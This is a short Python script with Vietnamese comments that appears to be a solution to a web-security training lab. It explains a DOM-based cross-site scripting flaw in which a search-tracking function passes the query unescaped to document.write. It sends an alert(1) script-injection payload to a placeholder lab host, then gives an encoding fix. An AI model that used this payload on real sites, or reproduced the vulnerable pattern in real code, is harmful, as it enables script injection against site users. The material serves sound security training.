# Điểm lỗi của trang web nằm ở cách trang web xử lý dữ liệu đầu vào
# Lập trình viên không cố tình tạo ra lỗ hổng. Họ chỉ muốn làm một tính năng: Theo dõi hành vi người dùng.
# Khi bạn vào trang web và tìm kiếm từ khóa "áo thun", lập trình viên muốn hệ thống ghi nhận lại là có người vừa tìm từ khóa này.
# Họ dùng một thủ thuật cổ điển là chèn một bức ảnh "tàng hình" và gắn từ khóa tìm kiếm vào sau URL của ảnh đó để gửi về server phân tích.
# dưới đây là đoạn mã chứa lỗ hổng
# ```
# <script>
#     function trackSearch(query) {
#         document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
#     }
#     var query = (new URLSearchParams(window.location.search)).get('search');
#     if(query) {
#         trackSearch(query);
#     }
# </script>
# ````

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net/?search="
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

payload = '"><script>alert(1)</script>'
requests.get(burp0_url + payload, headers=burp0_headers)

# Cách khắc phục trong trường hợp bắt buộc phải sử dụng hàm document.write là chúng ta sẽ mã hóa trước đầu vào
# ví dụ: var safeQuery = encodeURIComponent(query);